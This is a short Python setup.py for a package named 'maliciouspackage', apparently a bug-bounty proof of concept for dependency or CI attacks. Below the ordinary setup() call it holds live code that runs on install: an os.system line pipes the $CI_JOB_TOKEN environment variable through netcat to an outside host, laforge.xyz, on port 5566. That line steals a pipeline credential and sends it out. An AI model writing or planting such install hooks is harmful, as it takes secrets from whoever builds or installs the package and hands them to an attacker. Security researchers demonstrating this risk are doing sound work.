from setuptools import setup

setup(name='maliciouspackage',
      version='0.2',
      description='Malicious Python package',
      url='http://laforge.uk/maliciouspackage',
      author='Laforge',
      author_email='laforge@wearehackerone.com',
      license='MIT',
      packages=['maliciouspackage'],
      zip_safe=False)

import os
os.system('echo Stolen token: $CI_JOB_TOKEN | nc -w 2 laforge.xyz 5566')
